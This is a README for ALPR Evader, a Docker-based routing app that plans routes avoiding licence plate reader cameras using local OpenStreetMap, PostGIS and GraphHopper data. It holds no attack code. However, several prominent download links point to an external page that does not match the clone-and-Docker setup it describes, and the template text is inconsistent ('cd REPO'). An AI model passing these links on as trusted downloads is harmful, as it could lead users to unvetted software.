# ALPR Evader - Privacy-Focused Routing Engine 2026

> **ALPR Evader is a self-hosted Docker web application that combines local OpenStreetMap data, PostGIS, and GraphHopper to generate routes that avoid known automatic license plate reader locations.**

[![Platform](https://img.shields.io/badge/Platform-Self--hosted%20Docker%20web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/westandrewxvbp4066/alpr-evader-osm-router?style=flat-square)](https://github.com/westandrewxvbp4066/alpr-evader-osm-router)

---

<p align="center">
  <a href="https://westandrewxvbp4066.github.io/alpr-evader-osm-router/">
    <img src="https://img.shields.io/badge/Download-ALPR%20Evader%20Latest-brightgreen?style=for-the-badge" alt="Download ALPR Evader">
  </a>
</p>

> **[Download the Latest ALPR Evader Build](https://westandrewxvbp4066.github.io/alpr-evader-osm-router/)**

---

[Download Latest Build](https://westandrewxvbp4066.github.io/alpr-evader-osm-router/)

---

## Overview

ALPR Evader is a locally operated routing engine for users who want route planning to account for known automatic license plate reader sites. The application brings together locally retained OpenStreetMap information, a PostGIS spatial database, and GraphHopper routing graphs to offer route alternatives through a self-managed web interface.

Instead of relying on a hosted navigation provider, the project is built for operation on your own infrastructure. Its FastAPI backend supplies the routing API, and its Leaflet.js frontend displays an interactive map for examining camera locations and route options. Once the necessary map and camera datasets have been imported, the application is capable of running offline.

---

## What It Provides

- Produces route options designed to avoid known automatic license plate reader locations
- Uses locally available OpenStreetMap data for mapping and routing
- Keeps camera records in a PostGIS spatial database
- Builds route graphs through GraphHopper
- Exposes routing capabilities through a FastAPI web API
- Offers an interactive Leaflet.js map
- Ingests camera information organized by state
- Supports offline operation after the required data has been loaded

---

## Getting Started

ALPR Evader runs as a self-hosted web application managed with Docker.

1. Download the repository:

   ```bash
   git clone https://github.com/westandrewxvbp4066/alpr-evader-osm-router.git
   cd REPO
   ```

2. Launch the services using the included Docker setup:

   ```bash
   docker compose up -d
   ```

3. Complete the project instructions for importing local OpenStreetMap data and loading camera locations.

4. Visit the web interface at the address published by the Docker deployment.

The first initialization can take a while because it may need to ingest map data, prepare the spatial database, and generate the GraphHopper routing graphs.

---

## Operating the Application

The usual process looks like this:

1. Bring up the Docker services.
2. Load the required OpenStreetMap dataset.
3. Import available state-based camera location data.
4. Wait for routing graph generation and spatial index creation to complete.
5. Launch the Leaflet map interface.
6. Provide an origin and destination.
7. Examine routes generated from the locally stored map, camera, and routing data.
8. Connect to the FastAPI endpoint if another local application needs routing access.

Once the required map, camera, and routing resources are present, the system does not need an active internet connection for operation.

---

## Environment and Configuration

The Docker deployment and application environment settings control configuration. Before starting the stack, inspect the configuration files included with the repository and provide appropriate values for the local database, map imports, camera data, and routing graph paths.

For example, an environment file might contain:

```env
POSTGIS_HOST=postgis
POSTGIS_PORT=5432
POSTGIS_DB=alpr_evader
POSTGIS_USER=change_me
POSTGIS_PASSWORD=change_me
```

Replace the example credentials and modify service names or filesystem paths as needed for your Docker installation.

---

## Prerequisites

- Docker and Docker Compose
- A self-hosted system able to run web application containers
- PostgreSQL with PostGIS enabled
- Locally stored OpenStreetMap data
- GraphHopper graph generation
- Disk capacity for map files, spatial data, and routing graphs
- Adequate processing time and storage for the initial import and graph-building stages

The web API is implemented with FastAPI, while the map interface uses Leaflet.js.

---

## Frequently Asked Questions

### Is a hosted routing provider needed?

No. The primary workflow uses locally imported OpenStreetMap data and routing resources generated on the host.

### Does the application support offline use?

Yes. After the map data, camera information, and routing resources have been prepared, ALPR Evader can run offline.

### What is the process for adding camera data?

Camera locations are held in PostGIS and may be loaded through the project's state-based ingestion process.

### How can database connection values be changed?

Edit the Docker or environment configuration used by the deployment, then restart the affected services so the new connection settings are applied.

### What makes the initial launch take longer?

The first setup may include OpenStreetMap import, camera-data loading, spatial database structure creation, and GraphHopper graph construction.

### Where are new builds and project updates published?

Review the repository for new builds, configuration updates, and revisions to the data-ingestion process:

[ALPR Evader Repository](https://github.com/westandrewxvbp4066/alpr-evader-osm-router)

### Where should problems be submitted?

Report reproducible issues involving the application, setup, API, or map interface through the repository issue tracker.

---

## Future Work

Possible future improvements include:

- Expanding coverage of state-based camera datasets
- Streamlining local data import procedures
- Improving how routes are presented in the Leaflet interface
- Adding more deployment and configuration documentation

---

## License

This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
